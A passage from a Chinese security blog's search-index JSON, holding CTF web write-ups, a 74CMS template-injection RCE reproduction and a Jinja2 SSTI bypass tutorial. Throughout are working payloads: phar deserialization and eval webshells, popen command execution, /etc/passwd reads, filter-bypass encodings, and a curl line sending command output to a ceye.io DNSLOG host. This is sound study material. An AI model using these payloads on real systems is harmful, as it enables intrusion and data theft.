返回该类的所有子类 __mro__ python支持多重继承，在解析__init__时，定义解析顺序的是子类的__mro__属性（值是类的元组） __slots__ 限制类动态添加属性 __getattribute__() 获取属性或方法，对模块和类都有效 __getitem__() 以索引取值或者键取值 __globals__ 返回函数所在模块命名空间中的所有变量 其他的具体内容参考flask SSTI即可。 0x07 Reference https://blog.szfszf.top/article/15/ https://www.m00nback.xyz/2020/02/16/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/ https://mp.weixin.qq.com/s/f5Ra8BtCyEoJmH0gwuvGXg","tags":[{"name":"Web安全学习","slug":"Web安全学习","permalink":"http://ca0y1h.top/tags/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"},{"name":"沙箱逃逸","slug":"沙箱逃逸","permalink":"http://ca0y1h.top/tags/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"}],"categories":[{"name":"Web安全基础学习","slug":"Web安全基础学习","permalink":"http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"纵横杯2020-Web-WriteUp","date":"2020-12-28T14:09:46.000Z","path":"Web_security/ctf_writeup/30.纵横杯2020-Web-WriteUp/","text":"纵横杯2020 Web WriteUp 题目源码： 链接: https://pan.baidu.com/s/1YiLgk931hrz3uqnQD3Dz6A 密码: dmqt 0x01 easycl 打开题目直接进入登录界面，有admin用户存在，弱密码无效。根据Wappalyzer提示，题目站点使用了CodeIgniter框架，通过比对题目环境的URL和CodeIgniter的三个大版本的源码，猜测应该用的是CodeIgniter4.0。前台登录有盲注存在： 可以用SQLMAP跑出数据库信息，但是进入后台没有什么用。再使用SQLMAP获取sql-shell，可以读取部分文件： 这道题坑的地方就在于网站根目录不在/var/www/下，通过读取 /etc/apache2/sites-enabled/000-default.conf得到网站根目录/var/sercet/html再用SQL拿到os-shell，搜索flag文件 读取flag文件 0x02 easycms www.zip 可以下载源码查看配置文件/common/config/config.php 用admin和admin868可以成功登陆网站后台。https://www.freebuf.com/vuls/248912.html这篇文章中提到了一个SSRF漏洞，代码进行对比之后，发现题目把漏洞换成了任意文件读取，文件位置：/core/class/collection.class.php 然后打比赛的时候就一直卡在这，现在想想真的是蠢，忘了去看yzmcms的官方issues，我说怎么这么多人做出来了。 照着这个复现一下就可以打过去：https://github.com/yzmcms/yzmcms/issues/53 找到了洞不知道怎么利用，真的是有够菜的，还是来看看原理。 当时最大的问题就是不能回显，当时我直接在网址配置中用file协议读文件： 提交之后，点击测试采集，在phpstorm打断点调试，在运行到100行的时候，content中的内容是/etc/passwd的文件内容。 但是在调用get_sub_content函数之后，content的值会被改变，我们跟进这个函数： 这个函数用了两次explode函数把content分割成一个数组，然后返回一个冒号。既然这样，我们知道flag的格式是flag&#123;&#125;那么把start改成f，把end改成&#125;，再经过这个函数处理后就可以保留关键的地方： 但是问题又来了，content的内容还要经过get_all_url函数的处理，继续跟进： 第65行preg_match_all函数提取a标签中的内容，并且在下面的foreach循环中，会接着提取href元素内容，既然如此，那么我们就把要读取的文件写在a标签的href元素中作为链接，然后封装在一个HTML文件中。 例如： 1z&lt;a href=&quot;file:///Users/ca01h/flag&quot;&gt;123&lt;/a&gt;y 模块采集配置： 跟进函数 但是在第83行还要经过url_check函数的检查，跟进： 这个函数内部规定了只允许HTTP或HTTPS协议，于是我们用file协议会直接报错。但这种检查前四个字符的方式未免有些简单粗暴，可以使用一个PHP特性绕过： When PHP encounters an unknown protocol, it will throw a warning and set the protocol to null. When the Protoco is null or file, the local operation will be carried out. By default, the local file operation will be performed if the protocol is not transferred or the protocol does not exist. 简单来说就是：当PHP遇到一个不存在的协议的时候，会把协议置空，并且当协议为空或者不存在时，会当做文件操作，即file协议。 既然这样，那我们最后的payload就是： 1z&lt;a href=&quot;httpxxx:///Users/ca01h/flag&quot;&gt;123&lt;/a&gt;y 最后成功返回到content参数中： 虽然有个warning，但是文件还是读出来了： 0x03 hellophp 这题也挺简单的，时间都花在上面那道题目了，真的是亏死。。 重点审计class.php这个文件，应该可以很明显的发现有反序列化的漏洞： 其中tile和comment都是可以控制的，那么利用其中一个变量即可。 接着需要寻找反序列化的触发点，全局搜索没有unserialize函数后，可以很快的发现admin.php有文件上传功能，那么肯定是要上传phar压缩包触发反序列化，再找文件操作的相关函数，在index.php中有file_exist函数： 把phar压缩包的路径传入img参数即可触发反序列化。 1234567891011121314151617181920212223242526&lt;?phpclass Config&#123; public $title; public $comment; public $logo_url; public function __construct($title, $comment) &#123; $this-&gt;title = $title; $this-&gt;comment = $comment; &#125;&#125;$title = &quot;1&#x27;.eval(\\$_POST[a]).&#x27;a&quot;;$comment = 456;ini_set(&#x27;phar.readonly&#x27;,&#x27;Off&#x27;);### POP链构造//@unlink(&quot;phar1.phar&quot;);//unlink() 函数删除文件。$phar = new Phar(&quot;phar.phar&quot;);$phar-&gt;startBuffering();//开始缓冲Phar写操作$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub$A = new Config($title, $comment);$phar-&gt;setMetadata($A);//将自定义的meta-data存入manifest$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);//以字符串的形式添加一个文件到phar档案添 加要压缩的文件 //签名自动计算$phar-&gt;stopBuffering(); 0x04 大家一起来审代码 看到这种量级的代码，出题人一般都是拿别市面上的CMS，这个时候就可以先找配置文件看看，在data/common.inc.php文件中： 有两个信息：第一出题人用的是seacms，第二数据库的用户名和密码是admin,admin，这个也是本网站的后台密码。 既然是seacms，那我们就充分发挥Google的作用：https://lhlh22.github.io/2020/10/22/Seacms-v10-1-后台getshell/#后台命令执行（三） 这篇文章提到了admin_notify.php文件： 过滤掉了括号和反引号，那么我们就可以直接include &quot;/flag&quot;;即可，payload： 12&#x2F;adm1n&#x2F;admin_notify.php?action&#x3D;setPOST: notify1&#x3D;&quot;;include &quot;&#x2F;flag&quot;;&#x2F;&#x2F;&amp;notify2&#x3D;2&amp;notify3&#x3D;3 再访问/data/admin/notify.php 除此之外，adm1n/admin_ip.php也可以写入webshell： 不知道这个preg_match有啥用。。 payload： 1POST: v&#x3D;&quot;;eval($_POST[1]);&#x2F;&#x2F;&amp;ip&#x3D;1.1.1.1","tags":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/tags/CTF/"}],"categories":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/categories/CTF/"}]},{"title":"骑士CMS模板注入+文件包含getshell复现","date":"2020-12-19T13:23:50.000Z","path":"code_audit/9.骑士CMS模板注入+文件包含getshell复现/","text":"骑士CMS模板注入+日志包含RCE复现 本文参考自TimeLine Sec团队成员microworld的复现记录。 0x01 漏洞概述 http://www.74cms.com/news/show-2497.html 骑士 CMS 官方发布安全更新，修复了一处远程代码执行漏洞。由于骑士 CMS 某些函数存在过滤不严格，攻击者通过构造恶意请求，配合文件包含漏洞可在无需登录的情况下执行任意代码，控制服务器。 0x02 影响版本 骑士 CMS &lt; 6.0.48 0x03 环境搭建 从官网下载6.0.20版本源代码 http://www.74cms.com/download/index.html 新建数据库，用MAMP Pro搭建站点 0x04 漏洞复现 发送如下请求： 12345http:&#x2F;&#x2F;[IP]&#x2F;index.php?m&#x3D;home&amp;a&#x3D;assign_resume_tplPOST:variable&#x3D;1&amp;tpl&#x3D;&lt;?php phpinfo(); ob_flush();?&gt;&#x2F;r&#x2F;n&lt;qscms&#x2F;company_show 列表名&#x3D;&quot;info&quot; 企业id&#x3D;&quot;$_GET[&#39;id&#39;]&quot;&#x2F;&gt; 查看站点日志，文件位于/data/Runtime/Logs/home/20_12_15.log 包含日志 0x05 漏洞分析 在正式分析漏洞之前，先看一看74CMS的路由和日志记录。 由于74CMS是基于ThinkPHP 3.2.3，其标准的URL路径为： 1http:&#x2F;&#x2F;[IP]&#x2F;index.php&#x2F;模块&#x2F;控制器&#x2F;操作 但是74CMS采用的是普通模式，使用传统的GET传参来指定当前访问的模块、控制器和方法，例如： 1http:&#x2F;&#x2F;localhost&#x2F;?m&#x3D;模块&amp;c&#x3D;控制器&amp;a&#x3D;方法&amp;var&#x3D;参数 当然这些参数也是可以自定义的，配置文件位于ThinkPHP/Conf/convention.php 其次，ThinkPHP定义了日志记录的方式，在ThinkPHP/Library/Think/Log.class.php中的write方法： ERR代表一般性错误，$destination是日志的存储位置，日志文件名是有年_月_日组成。 根据官方通告，漏洞代码位于Application/Common/Controller/BaseController.class.php的assign_resume_tpl方法，用于渲染简历模板： 继续跟进fetch函数，该函数位于Controllor.class.php文件中： 函数内部又调用了ThinkPHP/Lirary/Think/View.class.php类中的fetch方法： content为空进入第一个if判断，模板文件不存在的话直接返回，下一个if语句判断TMPL_ENGINE_TYPE是否是php，我们可以全局搜索这个常量，在ThinkPHP/Conf/convention.php中定义为Think，也就是说使用Think模板，那么就进入到else语句中。 首先构造一个参数数组$params，然后将调用静态方法Hook::listen，继续跟进，位于ThinkPHP/Library/Hook.class.php文件中： 此时tag=view_parse，该方法会查找$tags中有没有绑定view_parse事件的方法，然后用foreach遍历$tags属性，并执行Hook:exec方法。 此方法会检查行为名称中是否存在Behavior，若存在此关键字，行为扩展必须使用run入口方法，关于Hook的配置在/ThinkPHP/Mode/common.php中 继续跟进到ThinkPHP/Behavior/ParseTemplateBehavior.class.php，找到文件中的run方法： 已知74CMS采用的是Think模板引擎，当首次运行时不存在缓存文件，会进入到else语句中，新建一个Template类，在调用类中的fetch方法，位于ThinkPHP/Library/Think/Template.class.php文件： 调用loadTemplate()，将其存入templateCacheFile中，我们跟入loadTemplate： 首先读取templateFile的文件内容存到tmplContent中，然后再调用compiler函数编译模板内容，继续跟进： 传入的模板内容未经过过滤就直接被拼接到$tmplContent变量，然后返回loadTemplate方法，调用put方法写入缓存文件，并返回缓存文件名，于是我们再回归到fetch()方法，调用了Storage::load，位于ThinkPHP/Library/Think/Storage/Driver/File.class.php： 这里就直接包含文件，最终造成了模板注入。","tags":[{"name":"代码审计","slug":"代码审计","permalink":"http://ca0y1h.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"categories":[{"name":"代码审计","slug":"代码审计","permalink":"http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"PHP","slug":"代码审计/PHP","permalink":"http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/"}]},{"title":"jinja_SSTI_Bypass","date":"2020-12-19T13:23:14.000Z","path":"Web_security/basic_learning/28.Jinja2的SSTI+Bypass/","text":"jinja2 SSTI &amp; Bypass 本文主要针对jinja2的SSTI做一些讲解和说明。 常用的内建属性 __class__ 用于返回对象所属的类，和type()相同： 123456&gt;&gt;&gt; &#x27;&#x27;.__class__&lt;class &#x27;str&#x27;&gt;&gt;&gt;&gt; ().__class__&lt;class &#x27;tuple&#x27;&gt;&gt;&gt;&gt; [].__class__&lt;class &#x27;list&#x27;&gt; __base__ 以字符串的形式返回一个类所继承的类，一般情况下是object __bases__ 以元组的形式返回一个类所继承的类 __mro__ 返回解析方法调用的顺序，按照子类到父类到父父类的顺序返回所有类 1234567891011121314151617&gt;&gt;&gt; class Father():... def __init__(self):... pass...&gt;&gt;&gt; class GrandFather():... def __init__(self):... pass...&gt;&gt;&gt; class son(Father,GrandFather):... pass...&gt;&gt;&gt; print(son.__base__)&lt;class &#x27;__main__.Father&#x27;&gt;&gt;&gt;&gt; print(son.__bases__)(&lt;class &#x27;__main__.Father&#x27;&gt;, &lt;class &#x27;__main__.GrandFather&#x27;&gt;)&gt;&gt;&gt; print(son.__mro__)(&lt;class &#x27;__main__.son&#x27;&gt;, &lt;class &#x27;__main__.Father&#x27;&gt;, &lt;class &#x27;__main__.GrandFather&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;) __subclasses__() 得到object类后，就可以用__subclasses__()获取所有的子类： 12&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, &lt;class &#x27;weakcallableproxy&#x27;&gt;, &lt;class &#x27;weakproxy&#x27;&gt;, &lt;class &#x27;int&#x27;&gt;, &lt;class &#x27;bytearray&#x27;&gt;, &lt;class &#x27;bytes&#x27;&gt;, &lt;class &#x27;list&#x27;&gt;, &lt;class &#x27;NoneType&#x27;&gt;, &lt;class &#x27;NotImplementedType&#x27;&gt;, &lt;class &#x27;traceback&#x27;&gt;, &lt;class &#x27;super&#x27;&gt;, &lt;class &#x27;range&#x27;&gt;, &lt;class &#x27;dict&#x27;&gt;, &lt;class &#x27;dict_keys&#x27;&gt;, &lt;class &#x27;dict_values&#x27;&gt;, &lt;class &#x27;dict_items&#x27;&gt;, &lt;class &#x27;odict_iterator&#x27;&gt;, &lt;class &#x27;set&#x27;&gt;, &lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;slice&#x27;&gt;, &lt;class &#x27;staticmethod&#x27;&gt;, &lt;class &#x27;complex&#x27;&gt;, &lt;class &#x27;float&#x27;&gt;, &lt;class &#x27;frozenset&#x27;&gt;, &lt;class &#x27;property&#x27;&gt;, &lt;class &#x27;managedbuffer&#x27;&gt;, &lt;class &#x27;memoryview&#x27;&gt;, &lt;class &#x27;tuple&#x27;&gt;, &lt;class &#x27;enumerate&#x27;&gt;...... __dict__ 我们在获得到一个模块时想调用模块中的方法，恰好该方法被过滤了，就可以用该方法bypass 12345&gt;&gt;&gt; import os&gt;&gt;&gt; os.system(&#x27;ls&#x27;)1 2&gt;&gt;&gt; os.__dict__[&#x27;s&#x27;+&#x27;ystem&#x27;](&#x27;ls&#x27;)1 2 与dir()作用相同，都是返回属性、方法等；但一些数据类型是没有__dict__属性的，如[].__dict__会返回错误 __dict__只会显示属于自己的属性，dir()除了显示自己的属性，还显示从父类继承来的属性 可以使用__dict__来间接调用一些属性或方法，如： 1234&gt;&gt;&gt; a = []&gt;&gt;&gt; [].__class__.__dict__[&#x27;append&#x27;](a, &#x27;ling&#x27;)&gt;&gt;&gt; a[&#x27;ling&#x27;] __init__ __init__用于初始化类，作用就是为了得到function/method模型 123456789101112131415&gt;&gt;&gt; class Base:... def __init__(self, a, b):... self.a = a... def func():... pass...&gt;&gt;&gt; class Child(Base):... pass...&gt;&gt;&gt; Child&lt;class &#x27;__main__.Child&#x27;&gt;&gt;&gt;&gt; Child.__init__&lt;function Base.__init__ at 0x10cc23e50&gt;&gt;&gt;&gt; Child.func&lt;function Base.func at 0x10cc23ee0&gt; __globals__ 会以字典类型返回当前位置的全部模块，方法和全局变量，用于配合__init__使用 12345678910111213&gt;&gt;&gt; class Student:... def __init__(self):... pass...&gt;&gt;&gt; stu = Student()&gt;&gt;&gt; stu.__init__&lt;bound method Student.__init__ of &lt;__main__.Student object at 0x10cc71880&gt;&gt;&gt;&gt;&gt; stu.__init__.__globals__&#123;&#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None, &#x27;__package__&#x27;: None, &#x27;__loader__&#x27;: &lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;, &#x27;__spec__&#x27;: None, &#x27;__annotations__&#x27;: &#123;&#125;, &#x27;__builtins__&#x27;: &lt;module &#x27;builtins&#x27; (built-in)&gt;, &#x27;Base&#x27;: &lt;class &#x27;__main__.Base&#x27;&gt;, &#x27;Child&#x27;: &lt;class &#x27;__main__.Child&#x27;&gt;, &#x27;Student&#x27;: &lt;class &#x27;__main__.Student&#x27;&gt;, &#x27;stu&#x27;: &lt;__main__.Student object at 0x10cc71880&gt;&#125;&gt;&gt;&gt; Student.__init__.__globals__&#123;&#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None, &#x27;__package__&#x27;: None, &#x27;__loader__&#x27;: &lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;, &#x27;__spec__&#x27;: None, &#x27;__annotations__&#x27;: &#123;&#125;, &#x27;__builtins__&#x27;: &lt;module &#x27;builtins&#x27; (built-in)&gt;, &#x27;Base&#x27;: &lt;class &#x27;__main__.Base&#x27;&gt;, &#x27;Child&#x27;: &lt;class &#x27;__main__.Child&#x27;&gt;, &#x27;Student&#x27;: &lt;class &#x27;__main__.Student&#x27;&gt;, &#x27;stu&#x27;: &lt;__main__.Student object at 0x10cc71880&gt;&#125;&gt;&gt;&gt; Student.__init__&lt;function Student.__init__ at 0x10cc23f70&gt; 果该关键字被过滤了我们可以使用__getattribute__，以下两者等效 12__init__.__globals__[&#39;sys&#39;]__init__.__getattribute__(&#39;__global&#39;+&#39;s__&#39;)[&#39;sys&#39;] builtins、__builtin__、__builtins__的区别 在 Python 中，有很多函数不需要任何 import 就可以直接使用，例如chr、open。之所以可以这样，是因为 Python 有个叫内建模块（或者叫内建命名空间）的东西，它有一些常用函数，变量和类。 在 2.x 版本中，内建模块被命名为 __builtin__，到了 3.x 就成了 builtins。它们都需要 import 才能查看： python2 123&gt;&gt;&gt; import __builtin__&gt;&gt;&gt; __builtin__&lt;module &#x27;__builtin__&#x27; (built-in)&gt; python3 123&gt;&gt;&gt; import builtins&gt;&gt;&gt; builtins&lt;module &#x27;builtins&#x27; (built-in)&gt; 而__builtins__ 两者都有，实际上是__builtin__和builtins 的引用。它不需要导入。不过__builtins__与__builtin__和builtins是有一点区别的，__builtins__ 相对实用一点，并且在 __builtins__里有很多好东西： 123456789&gt;&gt;&gt; &#x27;__import__&#x27; in dir(__builtins__)True&gt;&gt;&gt; __builtins__.__dict__[&#x27;__import__&#x27;](&#x27;os&#x27;).system(&#x27;whoami&#x27;)macr0phag30&gt;&gt;&gt; &#x27;eval&#x27; in dir(__builtins__)True&gt;&gt;&gt; &#x27;execfile&#x27; in dir(__builtins__)True 构造链的思路 第一步 使用__class__来获取内置类所对应的类，可以使用str，dict，tuple，list等来获取。 12345678910&gt;&gt;&gt; &#x27;&#x27;.__class__&lt;class &#x27;str&#x27;&gt;&gt;&gt;&gt; [].__class__&lt;class &#x27;list&#x27;&gt;&gt;&gt;&gt; ().__class__&lt;class &#x27;tuple&#x27;&gt;&gt;&gt;&gt; &#123;&#125;.__class__&lt;class &#x27;dict&#x27;&gt;&gt;&gt;&gt; &quot;&quot;.__class__&lt;class &#x27;str&#x27;&gt; 第二步 拿到object基类 用__bases__[0]拿到基类： 12&gt;&gt;&gt; &#x27;&#x27;.__class__.__bases__[0]&lt;class &#x27;object&#x27;&gt; 用__base__拿到基类： 12&gt;&gt;&gt; &#x27;&#x27;.__class__.__base__&lt;class &#x27;object&#x27;&gt; 用__mro__[1]或__mro__[-1]拿到基类： 1234&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__[1]&lt;class &#x27;object&#x27;&gt;&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__[-1]&lt;class &#x27;object&#x27;&gt; 第三步 用__subclasses__()拿到子类列表： 12&gt;&gt;&gt; &#x27;&#x27;.__class__.__bases__[0].__subclasses__()...一大堆的子类 第四步 在子类列表中寻找中寻找可以getshell的类 寻找利用链 我们一般来说是先知晓一些可以getshell的类，然后再去跑这些类的索引，然后这里先讲述如何去跑索引，再详写可以getshell的类 这里先给出一个在本地遍历的脚本，原理是先遍历所有子类，然后再遍历子类的方法的所引用的东西，来搜索是否调用了我们所需要的方法，这里以popen为例子。 local_find.py 123456789search = &#x27;popen&#x27;num = -1for i in ().__class__.__base__[0].__subclasses__: num += 1 try: if search in i.__init__.__globals__.keys(): print(num, i) except: pass 运行这个脚本后： 可以发现object基类的第132个子类名为os._wrap_close的这个类有popen方法 先调用它的__init__方法进行初始化类，再调用__globals__可以获取到方法内以字典的形式返回的方法、属性等值，最后调用popen函数来执行命令 但是上面的方法仅限于在本地寻找，remote_find.py 123456789101112import requestsimport timefor i in range(300): time.sleep(0.1) payload = &quot;&#123;&#123;().__class__.__mro__[-1].__subclasses__()[%s]&#125;&#125;&quot; % i url = &quot;&quot; r = requests.post(url + payload) if &quot;catch_warnings&quot; in r.text: print(r.text) print(i) break python3的方法 os._wrap_close类中的popen payload： 1&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__[&#39;popen&#39;](&#39;whoami&#39;).read()&#125;&#125; __import__中的os 把上面local_find.py脚本中的search变量换成__import__： 可以看到有5个类下是包含__import__的，随便用一个即可 payload： 1&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[80].__init__.__globals__.__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&#125;&#125; python2的方法 tips：python2的string类型不直接从属于属于基类，所以要用两次 __bases__[0] file类读写文件 然后直接调用里面的方法即可，payload如下： 123&#123;&#123;().__class__.__bases__[0].__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[40](&#x27;/etc/passwd&#x27;).readlines()&#125;&#125; warnings类中的linecache 1234&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[58]&lt;class &#x27;warnings.WarningMessage&#x27;&gt;&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59]&lt;class &#x27;warnings.catch_warnings&#x27;&gt; payload: 1[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&#x27;linecache&#x27;].os.popen(&#x27;whoami&#x27;).read() python2和python3通用方法 __builtins__代码执行 把上面local_find.py脚本search变量赋值为__builtins__ 再调用eval等函数和方法即可，payload： 1234567&#123;&#123;().__class__.__bases__[0].__subclasses__()[134].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;)&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[134].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;)&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[134].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[134].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;open&#x27;](&#x27;/etc/passwd&#x27;).read()&#125;&#125; 总而言之，原理都是先找到含有__builtins__的类，然后再进一步利用。 os 这个我在python3.8环境下好像没能找到直接含有os的类，python2.7.18下有两个类： 12&lt;class &#39;site._Printer&#39;&gt;&lt;class &#39;site.Quitter&#39;&gt; Payload： 1&#123;&#123;().__class__.__base__.__subclasses__()[76].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;whoami&#x27;).read()&#125;&#125; 获取配置信息 config 通常会用&#123;&#123;config&#125;&#125;查询配置信息 request jinja2中存在对象request 查询一些配置信息 1&#123;&#123;request.application.__self__._get_data_for_json.__globals__[&#39;json&#39;].JSONEncoder.default.__globals__[&#39;current_app&#39;].config&#125;&#125; 构造ssti的payload 12&#123;&#123;request.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;etc&#x2F;passwd&#39;).read()&#125;&#125;&#123;&#123;request.application.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;etc&#x2F;passwd&#39;).read()&#125;&#125; url_for 查询配置信息 1&#123;&#123;url_for.__globals__[&#39;current_app&#39;].config&#125;&#125; 构造ssti的payload 1&#123;&#123;url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&quot;)&#125;&#125; get_flashed_messages 查询配置信息 1&#123;&#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config&#125;&#125; 构造ssti的payload 1&#123;&#123;get_flashed_messages.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&quot;)&#125;&#125; Bypass 过滤. []绕过 12&#123;&#123;().__class__&#125;&#125;&#123;&#123;()[&#39;__class__&#39;]&#125;&#125; attr()绕过 12&#123;&#123;().__class__&#125;&#125;&#123;&#123;()|attr(&#39;__class__&#39;)&#125;&#125; getattr()绕过 12&#123;&#123;().__class__&#125;&#125;&#123;&#123;getattr((),&quot;__class__&quot;)&#125;&#125; 过滤引号 五种不同的请求方式绕过： 12345request.args.namerequest.values.namerequest.cookies.namerequest.headers.namerequest.form.name GET 1&#123;&#123;().__class__.__bases__[0].__subclasses__()[213].__init__.__globals__.__builtins__[request.args.arg1](request.args.arg2).read()&#125;&#125;&amp;arg1=open&amp;arg2=/etc/passwd POST 12&#123;&#123;().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__[request.values.arg1](request.values.arg2).read()&#125;&#125;POST:arg1=open&amp;arg2=/etc/passwd Cookie 12&#123;&#123;().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__[request.cookies.arg1](request.cookies.arg2).read()&#125;&#125;Cookie:arg1=open;arg2=/etc/passwd chr绕过 过滤_ 编码绕过 使用十六进制编码绕过，_编码后为\\x5f，.编码后为\\x2E payload： 1&#123;&#123;()[&quot;\\x5f\\x5fclass\\x5f\\x5f&quot;][&quot;\\x5f\\x5fbases\\x5f\\x5f&quot;][0][&quot;\\x5f\\x5fsubclasses\\x5f\\x5f&quot;]()[376][&quot;\\x5f\\x5finit\\x5f\\x5f&quot;][&quot;\\x5f\\x5fglobals\\x5f\\x5f&quot;][&#x27;popen&#x27;](&#x27;whoami&#x27;)[&#x27;read&#x27;]()&#125;&#125; 关键字也可以使用十六进制编码 12345678string1=&quot;__class__&quot;def tohex(string): result = &quot;&quot; for i in range(len(string)): result=result+&quot;\\\\x&quot;+hex(ord(string[i]))[2:] print(result) tohex(string1) 比如说NCTF2020 你是我的master吗 这道题： waf： 1blacklist = [&#x27;%&#x27;,&#x27;-&#x27;,&#x27;:&#x27;,&#x27;+&#x27;,&#x27;class&#x27;,&#x27;base&#x27;,&#x27;mro&#x27;,&#x27;_&#x27;,&#x27;config&#x27;,&#x27;args&#x27;,&#x27;init&#x27;,&#x27;global&#x27;,&#x27;.&#x27;,&#x27;\\&#x27;&#x27;,&#x27;req&#x27;,&#x27;|&#x27;,&#x27;attr&#x27;,&#x27;get&#x27;] payload： 1?name&#x3D;&#123;&#123;&quot;&quot;[&quot;\\x5f\\x5f\\x63\\x6c\\x61\\x73\\x73\\x5f\\x5f&quot;][&quot;\\x5f\\x5f\\x62\\x61\\x73\\x65\\x5f\\x5f&quot;][&quot;\\x5f\\x5f\\x73\\x75\\x62\\x63\\x6c\\x61\\x73\\x73\\x65\\x73\\x5f\\x5f&quot;]()[64][&quot;\\x5f\\x5f\\x69\\x6e\\x69\\x74\\x5f\\x5f&quot;][&quot;\\x5f\\x5f\\x67\\x6c\\x6f\\x62\\x61\\x6c\\x73\\x5f\\x5f&quot;][&quot;\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f&quot;][&quot;\\x5f\\x5f\\x69\\x6d\\x70\\x6f\\x72\\x74\\x5f\\x5f&quot;](&quot;\\x6f\\x73&quot;)[&quot;\\x70\\x6f\\x70\\x65\\x6e&quot;](&quot;ls&quot;)[&quot;\\x72\\x65\\x61\\x64&quot;]()&#125;&#125; 全16进制，只能在SSTI的时候用。 request绕过 同上 过滤关键字 双写、大小写 拼接字符 +拼接 12&#123;&#123;()[&#x27;__cla&#x27;+&#x27;ss__&#x27;].__bases__[0]&#125;&#125;&#123;&#123;()[&#x27;__cla&#x27;&#x27;ss__&#x27;].__bases__[0]&#125;&#125; join拼接 1&#123;&#123;()|attr([&quot;_&quot;*2,&quot;cla&quot;,&quot;ss&quot;,&quot;_&quot;*2]|join)&#125;&#125; 格式化+管道符 1&#123;&#123;()|attr(request.args.f|format(request.args.a))&#125;&#125;&amp;f=__c%sass__&amp;a=l 替代方法 过滤init，可以用__enter__或__exit__替代 过滤config 12&#123;&#123;self&#125;&#125; ⇒ &lt;TemplateReference None&gt;&#123;&#123;self.__dict__._TemplateReference__context&#125;&#125; 过滤[] 索引中的[] 123456&gt;&gt;&gt; [&quot;a&quot;,&quot;b&quot;,&quot;c&quot;][1]&#x27;b&#x27;&gt;&gt;&gt; [&quot;a&quot;,&quot;b&quot;,&quot;c&quot;].pop(1)&#x27;b&#x27;&gt;&gt;&gt; [&quot;a&quot;,&quot;b&quot;,&quot;c&quot;].__getitem__(1)&#x27;b&#x27; Payload： 123&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(433).__init__.__globals__.popen(&#x27;whoami&#x27;).read()&#125;&#123;&#123;().__class__.__base__.__subclasses__().pop(433).__init__.__globals__.popen(&#x27;whoami&#x27;).read()&#125;&#125; 魔术方法中的[] 魔术方法中本来是没有中括号的，但是如果需要使用[]绕过关键字的话，可以用__getattribute__绕过 1&#123;&#123;&quot;&quot;.__getattribute__(&quot;__cla&quot;+&quot;ss__&quot;).__base__&#125;&#125; 也可以配合requests绕过 1&#123;&#123;().__getattribute__(request.args.arg1).__base__&#125;&#125;&amp;arg1&#x3D;__class__ Payload: 1&#123;&#123;().__getattribute__(request.args.arg1).__base__.__subclasses__().pop(376).__init__.__globals__.popen(request.args.arg2).read()&#125;&#125;&amp;arg1=__class__&amp;arg2=whoami 过滤&#123;&#125; DNSLOG外带数据 用&#123;%%&#125;替代，使用判断语句进行dns外带数据： 1&#123;% if ().__class__.__base__.__subclasses__()[433].__init__.__globals__[&#x27;popen&#x27;](&quot;curl `whoami`.k1o75b.ceye.io&quot;).read()==&#x27;ssti&#x27; %&#125;1&#123;% endif %&#125; 盲注 123456789101112131415161718import requestsurl = 